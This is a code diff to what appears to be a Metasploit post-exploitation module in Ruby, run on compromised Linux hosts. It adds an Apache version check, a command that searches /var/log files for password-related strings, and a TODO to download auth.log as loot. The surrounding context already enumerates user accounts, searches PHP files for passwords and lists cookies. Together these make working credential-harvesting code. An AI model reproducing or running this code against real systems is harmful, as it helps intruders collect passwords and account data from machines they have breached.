@@ -226,6 +226,7 @@ def run
       mem_dirty = cmd_exec("cat /proc/meminfo | grep \"Dirty\" | awk {'print $2,$3'}")
       mem_free = cmd_exec("cat /proc/meminfo | grep \"MemFree\" | awk {'print $2,$3'}")
       mem_total = cmd_exec("cat /proc/meminfo | grep \"MemTotal\" | awk {'print $2,$3'}")
+      httpd_version = cmd_exec("apache2 -v | head -n 1 | awk {'print $3'} | cut -d '/' -f2")
       sh_version = cmd_exec("bash --version | head -n 1 | awk {'print $4'} | cut -d '-' -f1")
       mem_available = cmd_exec("cat /proc/meminfo | grep \"MemAvailable\" | awk {'print $2,$3'}")
       model_name = cmd_exec("lscpu | grep \"Model name:\" | awk {'print $3,$4,$5,$6,$7,$8,$9,$10'}")
@@ -261,7 +262,7 @@ def run
         data_dump << "Target mem free     : #{mem_free}\n"
         data_dump << "Target mem available: #{mem_available}\n"
         data_dump << "Target mem dirty    : #{mem_dirty}\n"
-          if system_lang =~ /C/ || system_lang =~ /'C'/ # strange bug under my distro :(
+          if system_lang =~ /C/ || system_lang =~ /'C'/     # strange bug under my distro :(
             data_dump << "System language     : pt_PT\n"
           else
             data_dump << "System language     : #{system_lang}\n"
@@ -272,6 +273,7 @@ def run
         data_dump << "Python version      : #{py_version}\n"
         data_dump << "PostgreSQL version  : #{psq_version}\n"
         data_dump << "GCC version         : #{gcc_version}\n"
+        data_dump << "Apache2 version     : #{httpd_version}\n"
           #
           # Display (only) remote installed browsers versions ..
           #
@@ -428,6 +430,13 @@ def run
           uuid_id = cmd_exec("for i in $(cat /etc/passwd | cut -d ':' -f1); do id $i; done")
           # find php var password strings
           php_passwd = cmd_exec("find / -name \"*.php\" -print0 | xargs -0 grep -i -n \"var password\"")
+          # Check log files for keywords (pass|user|passphrase) and show positive matches
+          log_auth = cmd_exec("egrep -l -i 'pass|passwd|password|passphrase' /var/log/*.log")
+          # download auth.log from target system
+          # TODO: client.fs.file.download("~/.msf4/loot/auth.log","/var/log/auth.log")
+
+
+
             #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
@@ -461,6 +470,10 @@ def run
             data_dump << "PHP PASSWORDS:\n"
             data_dump << "--------------\n"
             data_dump << php_passwd
+            data_dump << "\n\n"
+            data_dump << "LOGFILES WITH 'PASS' STRING INSIDE:\n"
+            data_dump << "-----------------------------------\n"
+            data_dump << log_auth
             data_dump << "\n\n"
             data_dump << "LISTING COOKIES :\n"
             data_dump << "-----------------\n"
